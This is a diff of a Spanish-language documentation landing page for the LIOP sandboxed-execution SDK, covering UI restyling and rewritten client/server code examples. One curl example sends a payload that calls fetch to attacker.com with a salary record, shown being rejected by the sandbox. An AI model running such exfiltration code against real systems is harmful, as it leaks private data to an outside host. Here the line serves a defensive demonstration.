@@ -5,37 +5,49 @@ icon: "rocket"
 mode: "wide"
 ---
 
-export const LiopBrandHeader = () => (
-  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mt-2 sm:mt-3 mb-6 gap-4 not-prose border-b border-zinc-200 dark:border-zinc-800/80 pb-5">
-    <div className="flex items-center gap-3">
-      <div className="relative w-[180px] sm:w-[210px] h-[34px] sm:h-[40px]">
-        <img src="/logo/dark.svg" alt="Protocolo LIOP" className="hidden dark:block w-full h-full object-contain object-left pointer-events-none" />
-        <img src="/logo/light.svg" alt="Protocolo LIOP" className="block dark:hidden w-full h-full object-contain object-left pointer-events-none" />
+export const LiopBrandHeader = () => {
+  const [version, setVersion] = useState("v2.5.0");
+  useEffect(() => {
+    fetch("https://registry.npmjs.org/@nekzus/liop/latest")
+      .then((res) => res.json())
+      .then((data) => {
+        if (data?.version) setVersion(`v${data.version}`);
+      })
+      .catch(() => {});
+  }, []);
+
+  return (
+    <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mt-2 sm:mt-3 mb-6 gap-4 not-prose border-b border-zinc-200 dark:border-zinc-800/80 pb-5">
+      <div className="flex items-center gap-3">
+        <div className="relative w-[240px] sm:w-[270px] h-[44px] sm:h-[48px]">
+          <img src="/logo/dark.svg" alt="Protocolo LIOP" className="hidden dark:block w-full h-full object-contain object-left pointer-events-none" />
+          <img src="/logo/light.svg" alt="Protocolo LIOP" className="block dark:hidden w-full h-full object-contain object-left pointer-events-none" />
+        </div>
+      </div>
+      <div className="flex items-center flex-wrap gap-2 text-xs font-mono">
+        <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors">
+          npm: {version}
+        </a>
+        <a href="https://github.com/Nekzus/LIOP" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-700 dark:text-zinc-300 border border-zinc-300 dark:border-zinc-700/60 hover:bg-zinc-200 dark:hover:bg-zinc-800 transition-colors">
+          GitHub: Código Abierto
+        </a>
+        <span className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-600 dark:text-zinc-400 border border-zinc-300 dark:border-zinc-700/60">
+          Licencia: Apache-2.0
+        </span>
+        <span className="px-2.5 py-1 rounded-md bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/20">
+          ML-KEM-768
+        </span>
       </div>
     </div>
-    <div className="flex items-center flex-wrap gap-2 text-xs font-mono">
-      <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors">
-        npm: v2.4.0
-      </a>
-      <a href="https://github.com/Nekzus/LIOP" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-700 dark:text-zinc-300 border border-zinc-300 dark:border-zinc-700/60 hover:bg-zinc-200 dark:hover:bg-zinc-800 transition-colors">
-        GitHub: Código Abierto
-      </a>
-      <span className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-600 dark:text-zinc-400 border border-zinc-300 dark:border-zinc-700/60">
-        Licencia: Apache-2.0
-      </span>
-      <span className="px-2.5 py-1 rounded-md bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/20">
-        ML-KEM-768
-      </span>
-    </div>
-  </div>
-);
+  );
+};
 
 export const QuickstartBanner = () => (
-  <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between bg-[#0c0e12] dark:bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 md:p-6 w-full mb-6 gap-4 shadow-lg not-prose">
+  <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between bg-zinc-50 dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 rounded-xl p-5 md:p-6 w-full mb-6 gap-4 shadow-sm dark:shadow-lg not-prose">
     <div className="flex items-center gap-3 sm:gap-4 flex-1">
       <div className="flex flex-col min-w-0">
-        <span className="font-semibold text-base md:text-lg text-zinc-100">Guía de Inicio Rápido</span>
-        <span className="text-sm text-zinc-400 mt-1 leading-relaxed font-light">
+        <span className="font-semibold text-base md:text-lg text-zinc-900 dark:text-zinc-100">Guía de Inicio Rápido</span>
+        <span className="text-sm text-zinc-600 dark:text-zinc-400 mt-1 leading-relaxed font-light">
           Despliegue su primer Cliente y Servidor LIOP Zero-Trust en menos de 3 minutos con el SDK oficial de TypeScript.
         </span>
       </div>
@@ -44,23 +56,35 @@ export const QuickstartBanner = () => (
       <a href="/es/getting-started/quickstart" className="px-5 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 rounded-full font-semibold text-sm shadow transition-all duration-200 whitespace-nowrap text-center">
         Comenzar
       </a>
-      <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-5 py-2.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-100 border border-zinc-700 rounded-full font-semibold text-sm shadow transition-all duration-200 whitespace-nowrap text-center">
+      <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-5 py-2.5 bg-white dark:bg-zinc-800 hover:bg-zinc-100 dark:hover:bg-zinc-700 text-zinc-900 dark:text-zinc-100 border border-zinc-300 dark:border-zinc-700 rounded-full font-semibold text-sm shadow-sm transition-all duration-200 whitespace-nowrap text-center">
         Instalar en NPM
       </a>
     </div>
   </div>
 );
 
-export const ProtocolReleaseStrip = () => (
-  <div className="flex items-center gap-3 rounded-xl border border-zinc-800 bg-[#0c0e12] dark:bg-[#0c0e12] px-4 py-2.5 mb-8 w-full not-prose">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4 shrink-0 text-emerald-500">
-      <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
-    </svg>
-    <span className="text-xs sm:text-sm font-mono leading-relaxed text-zinc-300 dark:text-zinc-300">
-      <strong>LIOP v2.4.0 Versión Activa:</strong> Handshake nativo MCP Dual-Era (2026-07-28 y 2025-11-25) con cifrado post-cuántico ML-KEM-768. Consulte el <a href="/es/cookbook/mcp-migration" className="font-semibold underline underline-offset-4 decoration-1 text-emerald-400 hover:text-emerald-300">Recetario de Migración</a>.
-    </span>
-  </div>
-);
+export const ProtocolReleaseStrip = () => {
+  const [version, setVersion] = useState("v2.5.0");
+  useEffect(() => {
+    fetch("https://registry.npmjs.org/@nekzus/liop/latest")
+      .then((res) => res.json())
+      .then((data) => {
+        if (data?.version) setVersion(`v${data.version}`);
+      })
+      .catch(() => {});
+  }, []);
+
+  return (
+    <div className="flex items-center gap-3 rounded-xl border border-zinc-200 dark:border-zinc-800 bg-zinc-50 dark:bg-[#0c0e12] px-4 py-2.5 mb-8 w-full not-prose shadow-sm">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4 shrink-0 text-emerald-500">
+        <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
+      </svg>
+      <span className="text-xs sm:text-sm font-mono leading-relaxed text-zinc-700 dark:text-zinc-300">
+        <strong>LIOP {version} Versión Activa:</strong> Handshake nativo MCP Dual-Era (2026-07-28 y 2025-11-25) con cifrado post-cuántico ML-KEM-768. Consulte el <a href="/es/cookbook/mcp-migration" className="font-semibold underline underline-offset-4 decoration-1 text-emerald-600 dark:text-emerald-400 hover:text-emerald-500 dark:hover:text-emerald-300">Recetario de Migración</a>.
+      </span>
+    </div>
+  );
+};
 
 export const UseCaseTabs = () => {
   const [selected, setSelected] = useState(0);
@@ -71,52 +95,56 @@ export const UseCaseTabs = () => {
       codeExamples: [
         `import { LiopClient } from "@nekzus/liop";
 
-const client = new LiopClient({
-  target: "grpc://vault.mesh.internal:15021",
-  securityTier: 1,
+const client = new LiopClient();
+await client.connect("127.0.0.1:15021");
+
+// Inyección de lógica en origen mediante envoltura canónica callTool
+const result = await client.callTool({
+  name: "filter_telemetry",
+  arguments: {
+    payload: \`@LIOP{wasi_v1,LogAnomalies}
+      // Evaluado in-situ en V8 Isolate sobre 500 MB de registros crudos
+      const anomalies = records
+        .filter(r => r.status >= 500 && r.latencyMs > 250)
+        .map(r => r.latencyMs);
+
+      return {
+        totalAnomalies: anomalies.length,
+        p99LatencyMs: anomalies.sort((a, b) => a - b)[Math.floor(anomalies.length * 0.99)] || 0,
+        egressBytes: 312 // Únicamente viaja el resumen analítico
+      };
+    @END\`
+  }
 });
 
-// Despacha lógica de filtrado en sandbox directamente al enclave de origen
-const telemetry = await client.injectLogic({
-  enclaveId: "TelemetryVault_01",
-  fuelLimit: 50_000,
-  logic: \`
-    // Ejecutado in-situ en V8 Isolate sobre 500 MB de registros crudos
-    const results = records
-      .filter(r => r.status >= 500 && r.latencyMs > 250)
-      .map(r => r.latencyMs);
-
-    return {
-      totalAnomalies: results.length,
-      p99LatencyMs: results.sort((a, b) => a - b)[Math.floor(results.length * 0.99)] || 0,
-      egressBytes: 312 // Únicamente viaja el resumen analítico
-    };
-  \`
-});
-
-console.log("Recibo ZK In-Situ:", telemetry.receipt);`,
+console.log("Resultado Analítico In-Situ:", result.content[0].text);`,
         `# Invocación in-situ mediante la pasarela Border LIO Gateway HTTP/2
-curl -X POST https://mesh.liop.network:15018/v1/enclaves/vault/inject \\
+curl -X POST http://127.0.0.1:15018/mcp \\
   -H "Authorization: Bearer $LIOP_OAUTH_TOKEN" \\
   -H "Content-Type: application/json" \\
   -d '{
-    "enclave": "TelemetryVault_01",
-    "fuelLimit": 50000,
-    "quantizeBucket": 100,
-    "closure": "return { errors: records.filter(r => r.status >= 500).length }"
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "filter_telemetry",
+      "arguments": {
+        "payload": "@LIOP{wasi_v1,LogAnomalies}\\nreturn { errors: records.filter(r => r.status >= 500).length };\\n@END"
+      }
+    }
   }'`,
-        `use liop_client::{LiopRpcClient, InjectRequest};
+        `use liop_client::{LiopRpcClient, CallToolRequest};
 
-let client = LiopRpcClient::connect("http://127.0.0.1:15021").await?;
-let request = InjectRequest::new("TelemetryVault_01")
-    .with_fuel_limit(50_000)
-    .with_logic(r#"
-        let anomalies = records.iter().filter(|r| r.status >= 500).count();
-        format!("anomalies: {}", anomalies)
-    "#);
+let mut client = LiopRpcClient::connect("http://127.0.0.1:15021").await?;
+let request = CallToolRequest {
+    name: "filter_telemetry".into(),
+    arguments: serde_json::json!({
+        "payload": "@LIOP{wasi_v1,LogAnomalies}\nreturn records.filter(|r| r.status >= 500).count();\n@END"
+    }),
+};
 
-let response = client.inject_logic(request).await?;
-println!("Prueba atestada: {}", response.zk_receipt);`
+let response = client.call_tool(request).await?;
+println!("Salida atestada: {:?}", response.content);`
       ]
     },
     {
@@ -128,30 +156,37 @@ import { z } from "zod";
 
 const server = new LiopServer({
   name: "FinancialEnclave_01",
-  version: "2.4.0",
-  sandbox: {
-    maxMemoryMb: 128,
-    fuelLimit: 100_000,
-    poisonGlobals: true, // Neutraliza 25 APIs de host peligrosas (eval, fetch, process)
-    freezePrototypes: true // Congela 11 prototipos nativos (Object, Array, Promise)
-  }
+  version: "2.5.0",
 });
 
-server.registerTool({
-  name: "aggregate_payroll",
-  schema: z.object({ departmentId: z.string() }),
-  handler: async ({ departmentId }, context) => {
-    // El código inyectado no puede filtrar salarios individuales; solo resultados agregados
-    return context.computeAggregatedSalary(departmentId);
-  }
-});
+// Cargar registros sensibles del origen en el entorno seguro V8 Isolate
+server.setSandboxData(financialRecords);
 
-await server.listen(15021);`,
+server.tool(
+  "aggregate_payroll",
+  "Calcula totales departamentales sin exfiltrar salarios individuales",
+  { payload: z.string() },
+  async ({ payload }) => {
+    // 25 APIs del host están envenenadas; 11 prototipos permanecen congelados
+    return { content: [{ type: "text", text: "RESULTADO_AGREGADO" }] };
+  },
+  { enforceAggregationFirst: true }
+);
+
+await server.connectToMesh({ port: 15021 });`,
         `# Verificación del rechazo del sandbox ante intentos de fuga de datos
-curl -X POST https://mesh.liop.network:15018/v1/audit/ast-verify \\
+curl -X POST http://127.0.0.1:15018/mcp \\
   -H "Content-Type: application/json" \\
   -d '{
-    "payload": "fetch(\\"https://attacker.com/leak?data=\\" + records[0].salary)"
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "aggregate_payroll",
+      "arguments": {
+        "payload": "@LIOP{wasi_v1,Leak}\\nfetch(\\"https://attacker.com/leak?data=\\" + records[0].salary);\\n@END"
+      }
+    }
   }'
 # Respuesta: 403 Forbidden [AST_ALLOWLIST_VIOLATION: Identifier "fetch" is poisoned]`,
         `use liop_core::sandbox::{WasiSandbox, SandboxConfig};
@@ -169,24 +204,23 @@ let result = sandbox.execute_module(&wasm_bytes)?;`
       label: "Verificación de Recibos ZK",
       description: "Cada respuesta computacional incluye una prueba criptográfica que asocia el hash AST exacto y el resultado analítico al secreto efímero de sesión resistente a ataques cuánticos (ML-KEM-768).",
       codeExamples: [
-        `import { ReceiptVerificationEngine, QuantumKeyExchange } from "@nekzus/liop/security";
+        `import { LiopClient } from "@nekzus/liop";
 
-// 1. Establecer secreto de sesión ML-KEM-768 con el enclave remoto
-const keyExchange = new QuantumKeyExchange();
-const { ciphertext, sharedSecret } = await keyExchange.encapsulate(enclavePublicKey);
+const client = new LiopClient();
+await client.connect("127.0.0.1:15021");
 
-// 2. Validar la prueba computacional HMAC-SHA256
-const isValid = ReceiptVerificationEngine.verify({
-  receipt: executionResponse.zkReceipt,
-  sharedSecret,
-  expectedLogicHash: executionResponse.logicHash,
-  resultPayload: executionResponse.data
+const result = await client.callTool({
+  name: "compute_risk_score",
+  arguments: { accountId: "ACC-9021" },
 });
 
-if (!isValid) throw new Error("Cómputo alterado: prueba ZK inválida");
-console.log("Prueba verificada: integridad computacional garantizada por ML-KEM-768.");`,
+// Los recibos se verifican criptográficamente con los secretos de sesión ML-KEM-768
+const isVerified = client.verifier.verifyReceipt(result);
+if (!isVerified) throw new Error("Cómputo alterado: recibo ZK inválido");
+
+console.log("Atestación criptográfica válida. Prueba vinculada y confirmada.");`,
         `# Validación de Recibo ZK frente al consenso de notaría
-curl -X POST https://mesh.liop.network:15018/v1/receipts/verify \\
+curl -X POST http://127.0.0.1:15018/v1/receipts/verify \\
   -H "Authorization: Bearer $LIOP_OAUTH_TOKEN" \\
   -H "Content-Type: application/json" \\
   -d '{
@@ -211,7 +245,7 @@ import { z } from "zod";
 
 const legacyServer = new McpServer({
   name: "SupportTools",
-  version: "1.0.0"
+  version: "1.0.0",
 });
 
 // Las herramientas del servidor original se mantienen intactas
@@ -226,12 +260,12 @@ const bridge = new LiopMcpBridge(legacyServer, {
   security: {
     forbiddenKeys: ["tax_id", "credit_card"],
     piiPatterns: PII_PRESETS.US_COMPLIANT,
-    enableNerScanning: true
-  }
+    enableNerScanning: true,
+  },
 });
 
 await bridge.connect();`,
-        `# Conectar clientes modernos de escritorio (Claude / Cursor) mediante stdio
+        `# Conectar clientes de escritorio (Claude / Cursor) mediante stdio
 npx @nekzus/liop bridge --stdio --config ./claude_desktop_config.json`,
         `use liop_bridge::McpBridge;
 
@@ -246,9 +280,9 @@ bridge.run().await?;`
   const active = useCases[selected];
 
   return (
-    <section className="mx-auto w-full p-4 sm:p-6 rounded-xl bg-[#0c0e12] dark:bg-[#0c0e12] border border-zinc-800 flex flex-col lg:flex-row gap-4 sm:gap-6 not-prose mb-12 shadow-xl">
+    <section className="mx-auto w-full p-4 sm:p-6 rounded-xl bg-zinc-50 dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 flex flex-col lg:flex-row gap-4 sm:gap-6 not-prose mb-12 shadow-sm dark:shadow-xl">
       <nav className="flex flex-col lg:w-72 lg:shrink-0" aria-label="Casos de uso">
-        <h2 className="text-xs font-semibold mb-3 text-zinc-400 uppercase tracking-wider font-mono">
+        <h2 className="text-xs font-semibold mb-3 text-zinc-500 dark:text-zinc-400 uppercase tracking-wider font-mono">
           Paradigmas Centrales del Protocolo
         </h2>
         <div className="flex flex-wrap lg:flex-col gap-1.5 pb-2 lg:pb-0">
@@ -258,8 +292,8 @@ bridge.run().await?;`
               type="button"
               className={`px-3 py-2.5 text-left rounded-lg transition-all duration-200 text-sm font-medium ${
                 selected === idx
-                  ? "bg-zinc-800 text-zinc-100 border border-zinc-700 shadow-sm"
-                  : "text-zinc-400 hover:bg-zinc-850 hover:text-zinc-200 border border-transparent"
+                  ? "bg-white dark:bg-zinc-800 text-zinc-900 dark:text-zinc-100 border border-zinc-300 dark:border-zinc-700 shadow-sm"
+                  : "text-zinc-600 dark:text-zinc-400 hover:bg-zinc-200/60 dark:hover:bg-zinc-850 hover:text-zinc-900 dark:hover:text-zinc-200 border border-transparent"
               }`}
               onClick={() => setSelected(idx)}
             >
@@ -267,15 +301,15 @@ bridge.run().await?;`
             </button>
           ))}
         </div>
-        <p className="hidden lg:block mt-4 text-xs text-zinc-400 leading-relaxed border-t border-zinc-800/80 pt-3">
+        <p className="hidden lg:block mt-4 text-xs text-zinc-600 dark:text-zinc-400 leading-relaxed border-t border-zinc-200 dark:border-zinc-800/80 pt-3">
           {active.description}
         </p>
-        <a href="/es/concepts/logic-on-origin" className="hidden lg:block mt-auto text-xs underline text-emerald-400 hover:text-emerald-300 transition-colors pt-3">
+        <a href="/es/concepts/logic-on-origin" className="hidden lg:block mt-auto text-xs underline text-emerald-600 dark:text-emerald-400 hover:text-emerald-500 dark:hover:text-emerald-300 transition-colors pt-3">
           Consultar Especificación Formal →
         </a>
       </nav>
 
-      <div className="flex-1 w-full bg-zinc-950 rounded-lg overflow-hidden border border-zinc-800 min-w-0">
+      <div className="flex-1 w-full bg-white dark:bg-zinc-950 rounded-lg overflow-hidden border border-zinc-200 dark:border-zinc-800 min-w-0 shadow-sm">
         <CodeGroup>
           <pre className="language-typescript" filename="TypeScript">
             <code>{active.codeExamples[0]}</code>
@@ -298,54 +332,54 @@ export const ArchitectureGrid = () => (
       <h2 className="text-xl font-semibold text-zinc-900 dark:text-zinc-100">Componentes del Protocolo y Arquitectura</h2>
     </div>
     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
-        <a href="/es/typescript-sdk/overview" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+      <div className="flex flex-col items-start bg-white dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 rounded-xl p-5 hover:border-zinc-300 dark:hover:border-zinc-700 shadow-sm transition-all duration-200">
+        <a href="/es/typescript-sdk/overview" className="block rounded-lg overflow-hidden w-full border border-zinc-200 dark:border-zinc-800 mb-4 bg-zinc-50 dark:bg-zinc-950">
           <img src="/images/animated-sdk-flow-dark.svg" alt="Arquitectura del SDK TypeScript" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
           <img src="/images/animated-sdk-flow-light.svg" alt="Arquitectura del SDK TypeScript" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
         </a>
-        <a href="/es/typescript-sdk/overview" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+        <a href="/es/typescript-sdk/overview" className="text-lg font-semibold text-zinc-900 dark:text-zinc-100 mb-1 hover:underline">
           SDK de TypeScript y Puente MCP
         </a>
-        <p className="text-sm text-zinc-400 leading-relaxed">
+        <p className="text-sm text-zinc-600 dark:text-zinc-400 leading-relaxed">
           Runtime de alto rendimiento en Node.js con concurrencia mediante worker pool, enlaces dinámicos de cliente/servidor e integración de servidores MCP legados.
         </p>
       </div>
 
-      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
-        <a href="/es/concepts/zero-trust" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+      <div className="flex flex-col items-start bg-white dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 rounded-xl p-5 hover:border-zinc-300 dark:hover:border-zinc-700 shadow-sm transition-all duration-200">
+        <a href="/es/concepts/zero-trust" className="block rounded-lg overflow-hidden w-full border border-zinc-200 dark:border-zinc-800 mb-4 bg-zinc-50 dark:bg-zinc-950">
           <img src="/images/animated-security-layers-dark.svg" alt="Pipeline de Seguridad The Shield" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
           <img src="/images/animated-security-layers-light.svg" alt="Pipeline de Seguridad The Shield" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
         </a>
-        <a href="/es/concepts/zero-trust" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+        <a href="/es/concepts/zero-trust" className="text-lg font-semibold text-zinc-900 dark:text-zinc-100 mb-1 hover:underline">
           Seguridad Zero-Trust y The Shield
         </a>
-        <p className="text-sm text-zinc-400 leading-relaxed">
+        <p className="text-sm text-zinc-600 dark:text-zinc-400 leading-relaxed">
           Seis capas de defensa en profundidad: Guardian AST, aislamiento V8 Isolate con prototipos congelados, filtro Egress PII en 4 etapas y sellos Recibo ZK.
         </p>
       </div>
 
-      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
-        <a href="/es/concepts/specification" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+      <div className="flex flex-col items-start bg-white dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 rounded-xl p-5 hover:border-zinc-300 dark:hover:border-zinc-700 shadow-sm transition-all duration-200">
+        <a href="/es/concepts/architecture" className="block rounded-lg overflow-hidden w-full border border-zinc-200 dark:border-zinc-800 mb-4 bg-zinc-50 dark:bg-zinc-950">
           <img src="/images/architecture-dark.svg" alt="Arquitectura Tonic gRPC y Malla P2P" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
           <img src="/images/architecture-light.svg" alt="Arquitectura Tonic gRPC y Malla P2P" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
         </a>
-        <a href="/es/concepts/specification" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+        <a href="/es/concepts/architecture" className="text-lg font-semibold text-zinc-900 dark:text-zinc-100 mb-1 hover:underline">
           Tonic gRPC y Runtime Mesh P2P
         </a>
-        <p className="text-sm text-zinc-400 leading-relaxed">
+        <p className="text-sm text-zinc-600 dark:text-zinc-400 leading-relaxed">
           Multiplexación de transporte binario sobre HTTP/2, descubrimiento de pares Kademlia DHT con rust-libp2p y opciones simétricas de canal keepalive.
         </p>
       </div>
 
-      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
-        <a href="/es/operations/sovereign-deployment" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+      <div className="flex flex-col items-start bg-white dark:bg-[#0c0e12] border border-zinc-200 dark:border-zinc-800 rounded-xl p-5 hover:border-zinc-300 dark:hover:border-zinc-700 shadow-sm transition-all duration-200">
+        <a href="/es/operations/sovereign-deployment" className="block rounded-lg overflow-hidden w-full border border-zinc-200 dark:border-zinc-800 mb-4 bg-zinc-50 dark:bg-zinc-950">
           <img src="/images/animated-tee-flow-dark.svg" alt="Enclaves Soberanos y Atestación TEE" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
           <img src="/images/animated-tee-flow-light.svg" alt="Enclaves Soberanos y Atestación TEE" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
         </a>
-        <a href="/es/operations/sovereign-deployment" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+        <a href="/es/operations/sovereign-deployment" className="text-lg font-semibold text-zinc-900 dark:text-zinc-100 mb-1 hover:underline">
           Enclaves Soberanos y Observabilidad
         </a>
-        <p className="text-sm text-zinc-400 leading-relaxed">
+        <p className="text-sm text-zinc-600 dark:text-zinc-400 leading-relaxed">
           Despliegue tricapa aislado en Docker con Swarm PSK, atestación de hardware en enclaves Nitro TEE y monitoreo con 26 paneles en Prometheus y Grafana.
         </p>
       </div>
